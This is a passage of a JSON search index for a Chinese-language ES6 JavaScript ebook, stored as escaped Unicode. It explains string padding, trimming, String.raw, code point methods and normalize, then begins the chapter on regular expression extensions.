\u548c<code>padEnd()</code>\u4e00\u5171\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5b57\u7b26\u4e32\u8865\u5168\u751f\u6548\u7684\u6700\u5927\u957f\u5ea6\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u7528\u6765\u8865\u5168\u7684\u5b57\u7b26\u4e32\u3002</p> <p>\u5982\u679c\u539f\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\uff0c\u7b49\u4e8e\u6216\u5927\u4e8e\u6700\u5927\u957f\u5ea6\uff0c\u5219\u5b57\u7b26\u4e32\u8865\u5168\u4e0d\u751f\u6548\uff0c\u8fd4\u56de\u539f\u5b57\u7b26\u4e32\u3002</p> <pre><code>'x'.padStart(5, 'ab') // 'ababx'\n'x'.padStart(4, 'ab') // 'abax'\n\n'x'.padEnd(5, 'ab') // 'xabab'\n'x'.padEnd(4, 'ab') // 'xaba'\n\n'xxx'.padStart(2, 'ab') // 'xxx'\n'xxx'.padEnd(2, 'ab') // 'xxx'\n\n'abc'.padStart(10, '0123456789')\n// '0123456abc'\n</code></pre> <p>\u5982\u679c\u7701\u7565\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u9ed8\u8ba4\u4f7f\u7528\u7a7a\u683c\u8865\u5168\u957f\u5ea6\u3002</p> <pre><code>'x'.padStart(4) // '   x'\n'x'.padEnd(4) // 'x   '\n</code></pre> <p><code>padStart()</code>\u7684\u5e38\u89c1\u7528\u9014\u662f\u4e3a\u6570\u503c\u8865\u5168\u6307\u5b9a\u4f4d\u6570\u3002\u4e0b\u9762\u4ee3\u7801\u751f\u6210 10 \u4f4d\u7684\u6570\u503c\u5b57\u7b26\u4e32\u3002</p> <pre><code>'1'.padStart(10, '0') // \"0000000001\"\n'12'.padStart(10, '0') // \"0000000012\"\n'123456'.padStart(10, '0') // \"0000123456\"\n</code></pre> <p>\u53e6\u4e00\u4e2a\u7528\u9014\u662f\u63d0\u793a\u5b57\u7b26\u4e32\u683c\u5f0f\uff08\u8fd9\u4e2a\u7528\u9014\u6bd4\u8f83\u591a\uff09\u3002</p> <pre><code>'12'.padStart(10, 'YYYY-MM-DD') // \"YYYY-MM-12\"\n'09-12'.padStart(10, 'YYYY-MM-DD') // \"YYYY-09-12\"\n</code></pre>"},{"location":"ebook-JSES6-RYF/05-%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%96%B9%E6%B3%95/#trimstarttrimend","title":"trimStart()\uff0ctrimEnd()","text":"<p>ES2019 \u5bf9\u5b57\u7b26\u4e32\u5b9e\u4f8b\u65b0\u589e\u4e86<code>trimStart()</code>\u548c<code>trimEnd()</code>\u8fd9\u4e24\u4e2a\u65b9\u6cd5\u3002\u5b83\u4eec\u7684\u884c\u4e3a\u4e0e<code>trim()</code>\u4e00\u81f4\uff0c<code>trimStart()</code>\u6d88\u9664\u5b57\u7b26\u4e32\u5934\u90e8\u7684\u7a7a\u683c\uff0c<code>trimEnd()</code>\u6d88\u9664\u5c3e\u90e8\u7684\u7a7a\u683c\u3002\u5b83\u4eec\u8fd4\u56de\u7684\u90fd\u662f\u65b0\u5b57\u7b26\u4e32\uff0c\u4e0d\u4f1a\u4fee\u6539\u539f\u59cb\u5b57\u7b26\u4e32\u3002</p> <pre><code>const s = '  abc  ';\ns.trim() // \"abc\"\ns.trimStart() // \"abc  \"\ns.trimEnd() // \"  abc\"\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>trimStart()</code>\u53ea\u6d88\u9664\u5934\u90e8\u7684\u7a7a\u683c\uff0c\u4fdd\u7559\u5c3e\u90e8\u7684\u7a7a\u683c\u3002<code>trimEnd()</code>\u4e5f\u662f\u7c7b\u4f3c\u884c\u4e3a\u3002</p> <p>\u9664\u4e86\u7a7a\u683c\u952e\uff0c\u8fd9\u4e24\u4e2a\u65b9\u6cd5\u5bf9\u5b57\u7b26\u4e32\u5934\u90e8\uff08\u6216\u5c3e\u90e8\uff09\u7684 tab \u952e\u3001\u6362\u884c\u7b26\u7b49\u4e0d\u53ef\u89c1\u7684\u7a7a\u767d\u7b26\u53f7\u4e5f\u6709\u6548\u3002</p>"},{"location":"ebook-JSES6-RYF/05-%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%96%B9%E6%B3%95/#matchall","title":"matchAll()","text":"<p><code>matchAll()</code>\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f\u5728\u5f53\u524d\u5b57\u7b26\u4e32\u7684\u6240\u6709\u5339\u914d\u3002</p>"},{"location":"ebook-JSES6-RYF/05-%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%96%B9%E6%B3%95/#stringraw","title":"String.raw()","text":"<p>ES6 \u8fd8\u4e3a\u539f\u751f\u7684 String \u5bf9\u8c61\uff0c\u63d0\u4f9b\u4e86\u4e00\u4e2a<code>raw()</code>\u65b9\u6cd5\u3002\u8be5\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u659c\u6760\u90fd\u88ab\u8f6c\u4e49\uff08\u5373\u659c\u6760\u524d\u9762\u518d\u52a0\u4e00\u4e2a\u659c\u6760\uff09\u7684\u5b57\u7b26\u4e32\uff0c\u5f80\u5f80\u7528\u4e8e\u6a21\u677f\u5b57\u7b26\u4e32\u7684\u5904\u7406\u65b9\u6cd5\u3002String.raw() \u65b9\u6cd5\u53ef\u4ee5\u4f5c\u4e3a\u5904\u7406\u6a21\u677f\u5b57\u7b26\u4e32\u7684\u57fa\u672c\u65b9\u6cd5\uff0c\u5b83\u4f1a\u5c06\u6240\u6709\u53d8\u91cf\u66ff\u6362\uff0c\u800c\u4e14\u5bf9\u659c\u6760\u8fdb\u884c\u8f6c\u4e49\uff0c\u65b9\u4fbf\u4e0b\u4e00\u6b65\u4f5c\u4e3a\u5b57\u7b26\u4e32\u6765\u4f7f\u7528\u3002</p> <pre><code>String.raw`Hi\\n${2+3}!`;\n// \u8fd4\u56de \"Hi\\\\n5!\"\n\nString.raw`Hi\\u000A!`;\n// \u8fd4\u56de \"Hi\\\\u000A!\"\n</code></pre> <p>\u5982\u679c\u539f\u5b57\u7b26\u4e32\u7684\u659c\u6760\u5df2\u7ecf\u8f6c\u4e49\uff0c\u90a3\u4e48<code>String.raw()</code>\u4f1a\u8fdb\u884c\u518d\u6b21\u8f6c\u4e49\u3002</p> <pre><code>String.raw`Hi\\\\n`\n// \u8fd4\u56de \"Hi\\\\\\\\n\"\n\nString.raw`Hi\\\\n` === \"Hi\\\\\\\\n\" // true\n</code></pre> <p><code>String.raw()</code>\u65b9\u6cd5\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u6b63\u5e38\u7684\u51fd\u6570\u4f7f\u7528\u3002\u8fd9\u65f6\uff0c\u5b83\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u5e94\u8be5\u662f\u4e00\u4e2a\u5177\u6709<code>raw</code>\u5c5e\u6027\u7684\u5bf9\u8c61\uff0c\u4e14<code>raw</code>\u5c5e\u6027\u7684\u503c\u5e94\u8be5\u662f\u4e00\u4e2a\u6570\u7ec4\u3002</p> <pre><code>String.raw({ raw: 'test' }, 0, 1, 2);\n// 't0e1s2t'\n\n// \u7b49\u540c\u4e8e\nString.raw({ raw: ['t','e','s','t'] }, 0, 1, 2);\n</code></pre>"},{"location":"ebook-JSES6-RYF/05-%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%96%B9%E6%B3%95/#unicode","title":"Unicode \u65b9\u6cd5","text":""},{"location":"ebook-JSES6-RYF/05-%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%96%B9%E6%B3%95/#fromcodepoint","title":"fromCodePoint()","text":"<p>ES5 \u63d0\u4f9b<code>String.fromCharCode()</code>\u65b9\u6cd5\uff0c\u7528\u4e8e\u4ece Unicode \u7801\u70b9\u8fd4\u56de\u5bf9\u5e94\u5b57\u7b26\uff0c\u4f46\u662f\u8fd9\u4e2a\u65b9\u6cd5\u4e0d\u80fd\u8bc6\u522b\u7801\u70b9\u5927\u4e8e<code>0xFFFF</code>\u7684\u5b57\u7b26\u3002</p> <pre><code>String.fromCharCode(0x20BB7)\n// \"\u0bb7\"\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>String.fromCharCode()</code>\u4e0d\u80fd\u8bc6\u522b\u5927\u4e8e<code>0xFFFF</code>\u7684\u7801\u70b9\uff0c\u6240\u4ee5<code>0x20BB7</code>\u5c31\u53d1\u751f\u4e86\u6ea2\u51fa\uff0c\u6700\u9ad8\u4f4d<code>2</code>\u88ab\u820d\u5f03\u4e86\uff0c\u6700\u540e\u8fd4\u56de\u7801\u70b9<code>U+0BB7</code>\u5bf9\u5e94\u7684\u5b57\u7b26\uff0c\u800c\u4e0d\u662f\u7801\u70b9<code>U+20BB7</code>\u5bf9\u5e94\u7684\u5b57\u7b26\u3002</p> <p>ES6 \u63d0\u4f9b\u4e86<code>String.fromCodePoint()</code>\u65b9\u6cd5\uff0c\u53ef\u4ee5\u8bc6\u522b\u5927\u4e8e<code>0xFFFF</code>\u7684\u5b57\u7b26\uff0c\u5f25\u8865\u4e86<code>String.fromCharCode()</code>\u65b9\u6cd5\u7684\u4e0d\u8db3\u3002\u5728\u4f5c\u7528\u4e0a\uff0c\u6b63\u597d\u4e0e\u4e0b\u9762\u7684<code>codePointAt()</code>\u65b9\u6cd5\u76f8\u53cd\u3002</p> <pre><code>String.fromCodePoint(0x20BB7)\n// \"\ud842\udfb7\"\nString.fromCodePoint(0x78, 0x1f680, 0x79) === 'x\\uD83D\\uDE80y'\n// true\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5982\u679c<code>String.fromCodePoint</code>\u65b9\u6cd5\u6709\u591a\u4e2a\u53c2\u6570\uff0c\u5219\u5b83\u4eec\u4f1a\u88ab\u5408\u5e76\u6210\u4e00\u4e2a\u5b57\u7b26\u4e32\u8fd4\u56de\u3002</p> <p>\u6ce8\u610f\uff0c<code>fromCodePoint</code>\u65b9\u6cd5\u5b9a\u4e49\u5728<code>String</code>\u5bf9\u8c61\u4e0a\uff0c\u800c<code>codePointAt</code>\u65b9\u6cd5\u5b9a\u4e49\u5728\u5b57\u7b26\u4e32\u7684\u5b9e\u4f8b\u5bf9\u8c61\u4e0a\u3002</p>"},{"location":"ebook-JSES6-RYF/05-%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%96%B9%E6%B3%95/#codepointat","title":"codePointAt()","text":"<p>JavaScript \u5185\u90e8\uff0c\u5b57\u7b26\u4ee5 UTF-16 \u7684\u683c\u5f0f\u50a8\u5b58\uff0c\u6bcf\u4e2a\u5b57\u7b26\u56fa\u5b9a\u4e3a<code>2</code>\u4e2a\u5b57\u8282\u3002\u5bf9\u4e8e\u90a3\u4e9b\u9700\u8981<code>4</code>\u4e2a\u5b57\u8282\u50a8\u5b58\u7684\u5b57\u7b26\uff08Unicode \u7801\u70b9\u5927\u4e8e<code>0xFFFF</code>\u7684\u5b57\u7b26\uff09\uff0cJavaScript \u4f1a\u8ba4\u4e3a\u5b83\u4eec\u662f\u4e24\u4e2a\u5b57\u7b26\u3002</p> <pre><code>var s = \"\ud842\udfb7\";\n\ns.length // 2\ns.charAt(0) // ''\ns.charAt(1) // ''\ns.charCodeAt(0) // 55362\ns.charCodeAt(1) // 57271\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6c49\u5b57\u201c\ud842\udfb7\u201d\uff08\u6ce8\u610f\uff0c\u8fd9\u4e2a\u5b57\u4e0d\u662f\u201c\u5409\u7965\u201d\u7684\u201c\u5409\u201d\uff09\u7684\u7801\u70b9\u662f<code>0x20BB7</code>\uff0cUTF-16 \u7f16\u7801\u4e3a<code>0xD842 0xDFB7</code>\uff08\u5341\u8fdb\u5236\u4e3a<code>55362 57271</code>\uff09\uff0c\u9700\u8981<code>4</code>\u4e2a\u5b57\u8282\u50a8\u5b58\u3002\u5bf9\u4e8e\u8fd9\u79cd<code>4</code>\u4e2a\u5b57\u8282\u7684\u5b57\u7b26\uff0cJavaScript \u4e0d\u80fd\u6b63\u786e\u5904\u7406\uff0c\u5b57\u7b26\u4e32\u957f\u5ea6\u4f1a\u8bef\u5224\u4e3a<code>2</code>\uff0c\u800c\u4e14<code>charAt()</code>\u65b9\u6cd5\u65e0\u6cd5\u8bfb\u53d6\u6574\u4e2a\u5b57\u7b26\uff0c<code>charCodeAt()</code>\u65b9\u6cd5\u53ea\u80fd\u5206\u522b\u8fd4\u56de\u524d\u4e24\u4e2a\u5b57\u8282\u548c\u540e\u4e24\u4e2a\u5b57\u8282\u7684\u503c\u3002</p> <p>ES6 \u63d0\u4f9b\u4e86<code>codePointAt()</code>\u65b9\u6cd5\uff0c\u80fd\u591f\u6b63\u786e\u5904\u7406 4 \u4e2a\u5b57\u8282\u50a8\u5b58\u7684\u5b57\u7b26\uff0c\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u7684\u7801\u70b9\u3002</p> <pre><code>let s = '\ud842\udfb7a';\n\ns.codePointAt(0) // 134071\ns.codePointAt(1) // 57271\n\ns.codePointAt(2) // 97\n</code></pre> <p><code>codePointAt()</code>\u65b9\u6cd5\u7684\u53c2\u6570\uff0c\u662f\u5b57\u7b26\u5728\u5b57\u7b26\u4e32\u4e2d\u7684\u4f4d\u7f6e\uff08\u4ece 0 \u5f00\u59cb\uff09\u3002\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0cJavaScript \u5c06\u201c\ud842\udfb7a\u201d\u89c6\u4e3a\u4e09\u4e2a\u5b57\u7b26\uff0ccodePointAt \u65b9\u6cd5\u5728\u7b2c\u4e00\u4e2a\u5b57\u7b26\u4e0a\uff0c\u6b63\u786e\u5730\u8bc6\u522b\u4e86\u201c\ud842\udfb7\u201d\uff0c\u8fd4\u56de\u4e86\u5b83\u7684\u5341\u8fdb\u5236\u7801\u70b9 134071\uff08\u5373\u5341\u516d\u8fdb\u5236\u7684<code>20BB7</code>\uff09\u3002\u5728\u7b2c\u4e8c\u4e2a\u5b57\u7b26\uff08\u5373\u201c\ud842\udfb7\u201d\u7684\u540e\u4e24\u4e2a\u5b57\u8282\uff09\u548c\u7b2c\u4e09\u4e2a\u5b57\u7b26\u201ca\u201d\u4e0a\uff0c<code>codePointAt()</code>\u65b9\u6cd5\u7684\u7ed3\u679c\u4e0e<code>charCodeAt()</code>\u65b9\u6cd5\u76f8\u540c\u3002</p> <p>\u603b\u4e4b\uff0c<code>codePointAt()</code>\u65b9\u6cd5\u4f1a\u6b63\u786e\u8fd4\u56de 32 \u4f4d\u7684 UTF-16 \u5b57\u7b26\u7684\u7801\u70b9\u3002\u5bf9\u4e8e\u90a3\u4e9b\u4e24\u4e2a\u5b57\u8282\u50a8\u5b58\u7684\u5e38\u89c4\u5b57\u7b26\uff0c\u5b83\u7684\u8fd4\u56de\u7ed3\u679c\u4e0e<code>charCodeAt()</code>\u65b9\u6cd5\u76f8\u540c\u3002</p> <p><code>codePointAt()</code>\u65b9\u6cd5\u8fd4\u56de\u7684\u662f\u7801\u70b9\u7684\u5341\u8fdb\u5236\u503c\uff0c\u5982\u679c\u60f3\u8981\u5341\u516d\u8fdb\u5236\u7684\u503c\uff0c\u53ef\u4ee5\u4f7f\u7528<code>toString()</code>\u65b9\u6cd5\u8f6c\u6362\u4e00\u4e0b\u3002</p> <pre><code>let s = '\ud842\udfb7a';\n\ns.codePointAt(0).toString(16) // \"20bb7\"\ns.codePointAt(2).toString(16) // \"61\"\n</code></pre> <p>\u4f60\u53ef\u80fd\u6ce8\u610f\u5230\u4e86\uff0c<code>codePointAt()</code>\u65b9\u6cd5\u7684\u53c2\u6570\uff0c\u4ecd\u7136\u662f\u4e0d\u6b63\u786e\u7684\u3002\u6bd4\u5982\uff0c\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b57\u7b26<code>a</code>\u5728\u5b57\u7b26\u4e32<code>s</code>\u7684\u6b63\u786e\u4f4d\u7f6e\u5e8f\u53f7\u5e94\u8be5\u662f 1\uff0c\u4f46\u662f\u5fc5\u987b\u5411<code>codePointAt()</code>\u65b9\u6cd5\u4f20\u5165 2\u3002\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u7684\u4e00\u4e2a\u529e\u6cd5\u662f\u4f7f\u7528<code>for...of</code>\u5faa\u73af\uff0c\u56e0\u4e3a\u5b83\u4f1a\u6b63\u786e\u8bc6\u522b 32 \u4f4d\u7684 UTF-16 \u5b57\u7b26\u3002</p> <pre><code>let s = '\ud842\udfb7a';\nfor (let ch of s) {\n  console.log(ch.codePointAt(0).toString(16));\n}\n// 20bb7\n// 61\n</code></pre> <p>\u53e6\u4e00\u79cd\u65b9\u6cd5\u4e5f\u53ef\u4ee5\uff0c\u4f7f\u7528\u6269\u5c55\u8fd0\u7b97\u7b26\uff08<code>...</code>\uff09\u8fdb\u884c\u5c55\u5f00\u8fd0\u7b97\u3002</p> <pre><code>let arr = [...'\ud842\udfb7a']; // arr.length === 2\narr.forEach(\n  ch =&gt; console.log(ch.codePointAt(0).toString(16))\n);\n// 20bb7\n// 61\n</code></pre> <p><code>codePointAt()</code>\u65b9\u6cd5\u662f\u6d4b\u8bd5\u4e00\u4e2a\u5b57\u7b26\u7531\u4e24\u4e2a\u5b57\u8282\u8fd8\u662f\u7531\u56db\u4e2a\u5b57\u8282\u7ec4\u6210\u7684\u6700\u7b80\u5355\u65b9\u6cd5\u3002</p> <pre><code>function is32Bit(c) {\n  return c.codePointAt(0) &gt; 0xFFFF;\n}\n\nis32Bit(\"\ud842\udfb7\") // true\nis32Bit(\"a\") // false\n</code></pre>"},{"location":"ebook-JSES6-RYF/05-%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%96%B9%E6%B3%95/#normalize","title":"normalize()","text":"<p>\u8bb8\u591a\u6b27\u6d32\u8bed\u8a00\u6709\u8bed\u8c03\u7b26\u53f7\u548c\u91cd\u97f3\u7b26\u53f7\u3002\u4e3a\u4e86\u8868\u793a\u5b83\u4eec\uff0cUnicode \u63d0\u4f9b\u4e86\u4e24\u79cd\u65b9\u6cd5\u3002\u4e00\u79cd\u662f\u76f4\u63a5\u63d0\u4f9b\u5e26\u91cd\u97f3\u7b26\u53f7\u7684\u5b57\u7b26\uff0c\u6bd4\u5982<code>\u01d1</code>\uff08\\u01D1\uff09\u3002\u53e6\u4e00\u79cd\u662f\u63d0\u4f9b\u5408\u6210\u7b26\u53f7\uff08combining character\uff09\uff0c\u5373\u539f\u5b57\u7b26\u4e0e\u91cd\u97f3\u7b26\u53f7\u7684\u5408\u6210\uff0c\u4e24\u4e2a\u5b57\u7b26\u5408\u6210\u4e00\u4e2a\u5b57\u7b26\uff0c\u6bd4\u5982<code>O</code>\uff08\\u004F\uff09\u548c<code>\u02c7</code>\uff08\\u030C\uff09\u5408\u6210<code>\u01d1</code>\uff08\\u004F\\u030C\uff09\u3002</p> <p>\u8fd9\u4e24\u79cd\u8868\u793a\u65b9\u6cd5\uff0c\u5728\u89c6\u89c9\u548c\u8bed\u4e49\u4e0a\u90fd\u7b49\u4ef7\uff0c\u4f46\u662f JavaScript \u4e0d\u80fd\u8bc6\u522b\u3002</p> <pre><code>'\\u01D1'==='\\u004F\\u030C' //false\n\n'\\u01D1'.length // 1\n'\\u004F\\u030C'.length // 2\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0cJavaScript \u5c06\u5408\u6210\u5b57\u7b26\u89c6\u4e3a\u4e24\u4e2a\u5b57\u7b26\uff0c\u5bfc\u81f4\u4e24\u79cd\u8868\u793a\u65b9\u6cd5\u4e0d\u76f8\u7b49\u3002</p> <p>ES6 \u63d0\u4f9b\u5b57\u7b26\u4e32\u5b9e\u4f8b\u7684<code>normalize()</code>\u65b9\u6cd5\uff0c\u7528\u6765\u5c06\u5b57\u7b26\u7684\u4e0d\u540c\u8868\u793a\u65b9\u6cd5\u7edf\u4e00\u4e3a\u540c\u6837\u7684\u5f62\u5f0f\uff0c\u8fd9\u79f0\u4e3a Unicode \u6b63\u89c4\u5316\u3002</p> <pre><code>'\\u01D1'.normalize() === '\\u004F\\u030C'.normalize()\n// true\n</code></pre> <p><code>normalize</code>\u65b9\u6cd5\u53ef\u4ee5\u63a5\u53d7\u4e00\u4e2a\u53c2\u6570\u6765\u6307\u5b9a<code>normalize</code>\u7684\u65b9\u5f0f\uff0c\u53c2\u6570\u7684\u56db\u4e2a\u53ef\u9009\u503c\u5982\u4e0b\u3002</p> <ul> <li><code>NFC</code>\uff0c\u9ed8\u8ba4\u53c2\u6570\uff0c\u8868\u793a\u201c\u6807\u51c6\u7b49\u4ef7\u5408\u6210\u201d\uff08Normalization Form Canonical Composition\uff09\uff0c\u8fd4\u56de\u591a\u4e2a\u7b80\u5355\u5b57\u7b26\u7684\u5408\u6210\u5b57\u7b26\u3002\u6240\u8c13\u201c\u6807\u51c6\u7b49\u4ef7\u201d\u6307\u7684\u662f\u89c6\u89c9\u548c\u8bed\u4e49\u4e0a\u7684\u7b49\u4ef7\u3002</li> <li><code>NFD</code>\uff0c\u8868\u793a\u201c\u6807\u51c6\u7b49\u4ef7\u5206\u89e3\u201d\uff08Normalization Form Canonical Decomposition\uff09\uff0c\u5373\u5728\u6807\u51c6\u7b49\u4ef7\u7684\u524d\u63d0\u4e0b\uff0c\u8fd4\u56de\u5408\u6210\u5b57\u7b26\u5206\u89e3\u7684\u591a\u4e2a\u7b80\u5355\u5b57\u7b26\u3002</li> <li><code>NFKC</code>\uff0c\u8868\u793a\u201c\u517c\u5bb9\u7b49\u4ef7\u5408\u6210\u201d\uff08Normalization Form Compatibility Composition\uff09\uff0c\u8fd4\u56de\u5408\u6210\u5b57\u7b26\u3002\u6240\u8c13\u201c\u517c\u5bb9\u7b49\u4ef7\u201d\u6307\u7684\u662f\u8bed\u4e49\u4e0a\u5b58\u5728\u7b49\u4ef7\uff0c\u4f46\u89c6\u89c9\u4e0a\u4e0d\u7b49\u4ef7\uff0c\u6bd4\u5982\u201c\u56cd\u201d\u548c\u201c\u559c\u559c\u201d\u3002\uff08\u8fd9\u53ea\u662f\u7528\u6765\u4e3e\u4f8b\uff0c<code>normalize</code>\u65b9\u6cd5\u4e0d\u80fd\u8bc6\u522b\u4e2d\u6587\u3002\uff09</li> <li><code>NFKD</code>\uff0c\u8868\u793a\u201c\u517c\u5bb9\u7b49\u4ef7\u5206\u89e3\u201d\uff08Normalization Form Compatibility Decomposition\uff09\uff0c\u5373\u5728\u517c\u5bb9\u7b49\u4ef7\u7684\u524d\u63d0\u4e0b\uff0c\u8fd4\u56de\u5408\u6210\u5b57\u7b26\u5206\u89e3\u7684\u591a\u4e2a\u7b80\u5355\u5b57\u7b26\u3002</li> </ul> <pre><code>'\\u004F\\u030C'.normalize('NFC').length // 1\n'\\u004F\\u030C'.normalize('NFD').length // 2\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c<code>NFC</code>\u53c2\u6570\u8fd4\u56de\u5b57\u7b26\u7684\u5408\u6210\u5f62\u5f0f\uff0c<code>NFD</code>\u53c2\u6570\u8fd4\u56de\u5b57\u7b26\u7684\u5206\u89e3\u5f62\u5f0f\u3002<code>normalize</code>\u65b9\u6cd5\u76ee\u524d\u4e0d\u80fd\u8bc6\u522b\u4e09\u4e2a\u6216\u4e09\u4e2a\u4ee5\u4e0a\u5b57\u7b26\u7684\u5408\u6210\u3002\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u8fd8\u662f\u53ea\u80fd\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u901a\u8fc7 Unicode \u7f16\u53f7\u533a\u95f4\u5224\u65ad\u3002</p>"},{"location":"ebook-JSES6-RYF/06-%E6%AD%A3%E5%88%99/","title":"\u6b63\u5219\u7684\u6269\u5c55","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 21581  \u9605\u8bfb44\u5206\u949f</p> <p>\u8f83\u96be\uff0c\u65e5\u5e38\u5de5\u7a0b\u5f88\u5c11\u7528\u5230\u8fd9\u90e8\u5206\uff0c\u7528\u7684\u65f6\u5019\u518d\u5177\u4f53\u5b66\u3002</p>"},{"location":"ebook-JSES6-RYF/06-%E6%AD%A3%E5%88%99/#_2","title":"\u6784\u9020\u51fd\u6570","text":"<p>\u5728 ES5 \u4e2d\uff0c<code>RegExp</code>\u6784\u9020\u51fd\u6570\u7684\u53c2\u6570\u6709\u4e24\u79cd\u60c5\u51b5\u3002</p> <p>\u7b2c\u4e00\u79cd\u60c5\u51b5\u662f\uff0c\u53c2\u6570\u662f\u5b57\u7b26\u4e32\uff0c\u8fd9\u65f6\u7b2c\u4e8c\u4e2a\u53c2\u6570\u8868\u793a\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u4fee\u9970\u7b26\uff08flag\uff09\u3002</p> <pre><code>var regex = new RegExp('xyz', 'i');\nvar regex = /xyz/i;\n</code></pre> <p>\u7b2c\u4e8c\u79cd\u60c5\u51b5\u662f\uff0c\u53c2\u6570\u662f\u4e00\u4e2a\u6b63\u5219\u8868\u793a\u5f0f\uff0c\u8fd9\u65f6\u4f1a\u8fd4\u56de\u4e00\u4e2a\u539f\u6709\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u62f7\u8d1d\u3002</p> <pre><code>var regex = new RegExp(/xyz/i);\nvar regex = /xyz/i;\n</code></pre> <p>\u4f46\u662f\uff0cES5 \u4e0d\u5141\u8bb8\u6b64\u65f6\u4f7f\u7528\u7b2c\u4e8c\u4e2a\u53c2\u6570\u6dfb\u52a0\u4fee\u9970\u7b26\uff0c\u5426\u5219\u4f1a\u62a5\u9519\u3002</p> <pre><code>var regex = new RegExp(/xyz/, 'i');\n// Uncaught TypeError: Cannot supply flags when constructing one RegExp from another\n</code></pre> <p>ES6 \u6539\u53d8\u4e86\u8fd9\u79cd\u884c\u4e3a\u3002\u5982\u679c<code>RegExp</code>\u6784\u9020\u51fd\u6570\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u6b63\u5219\u5bf9\u8c61\uff0c\u90a3\u4e48\u53ef\u4ee5\u4f7f\u7528\u7b2c\u4e8c\u4e2a\u53c2\u6570\u6307\u5b9a\u4fee\u9970\u7b26\u3002\u800c\u4e14\uff0c\u8fd4\u56de\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u4f1a\u5ffd\u7565\u539f\u6709\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u4fee\u9970\u7b26\uff0c\u53ea\u4f7f\u7528\u65b0\u6307\u5b9a\u7684\u4fee\u9970\u7b26\u3002</p> <pre><code>new RegExp(/abc/ig, 'i').flags\n// \"i\"\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u539f\u6709\u6b63\u5219\u5bf9\u8c61\u7684\u4fee\u9970\u7b26\u662f<code>ig</code>\uff0c\u5b83\u4f1a\u88ab\u7b2c\u4e8c\u4e2a\u53c2\u6570<code>i</code>\u8986\u76d6\u3002</p>"},{"location":"ebook-JSES6-RYF/06-%E6%AD%A3%E5%88%99/#_3","title":"\u5b57\u7b26\u4e32\u7684\u6b63\u5219\u65b9\u6cd5","text":"<p>\u5b57\u7b26\u4e32\u5bf9\u8c61\u5171\u6709 4 \u4e2a\u65b9\u6cd5\uff0c\u53ef\u4ee5\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\uff1a<code>match()</code>\u3001<code>replace()</code>\u3001<code>search()</code>\u548c<code>split()</code>\u3002</p> <p>ES6 \u5c06\u8fd9 4 \u4e2a\u65b9\u6cd5\uff0c\u5728\u8bed\u8a00\u5185\u90e8\u5168\u90e8\u8c03\u7528<code>RegExp</code>\u7684\u5b9e\u4f8b\u65b9\u6cd5\uff0c\u4ece\u800c\u505a\u5230\u6240\u6709\u4e0e\u6b63\u5219\u76f8\u5173\u7684\u65b9\u6cd5\uff0c\u5168\u90fd\u5b9a\u4e49\u5728<code>RegExp</code>\u5bf9\u8c61\u4e0a\u3002<code>String.prototype.match</code> \u8c03\u7528 <code>RegExp.prototype[Symbol.match]</code></p>"},{"location":"ebook-JSES6-RYF/06-%E6%AD%A3%E5%88%99/#_4","title":"\u4fee\u9970\u7b26","text":""},{"location":"ebook-JSES6-RYF/06-%E6%AD%A3%E5%88%99/#u","title":"u \u4fee\u9970\u7b26","text":"<p>ES6 \u5bf9\u6b63\u5219\u8868\u8fbe\u5f0f\u6dfb\u52a0\u4e86<code>u</code>\u4fee\u9970\u7b26\uff0c\u542b\u4e49\u4e3a\u201cUnicode \u6a21\u5f0f\u201d\uff0c\u7528\u6765\u6b63\u786e\u5904\u7406\u5927\u4e8e<code>\\uFFFF</code>\u7684 Unicode \u5b57\u7b26\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u4f1a\u6b63\u786e\u5904\u7406\u56db\u4e2a\u5b57\u8282\u7684 UTF-16 \u7f16\u7801\u3002</p> <pre><code>/^\\uD83D/u.test('\\uD83D\\uDC2A') // false\n/^\\uD83D/.test('\\uD83D\\uDC2A') // true\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>\\uD83D\\uDC2A</code>\u662f\u4e00\u4e2a\u56db\u4e2a\u5b57\u8282\u7684 UTF-16 \u7f16\u7801\uff0c\u4ee3\u8868\u4e00\u4e2a\u5b57\u7b26\u3002\u4f46\u662f\uff0cES5 \u4e0d\u652f\u6301\u56db\u4e2a\u5b57\u8282\u7684 UTF-16 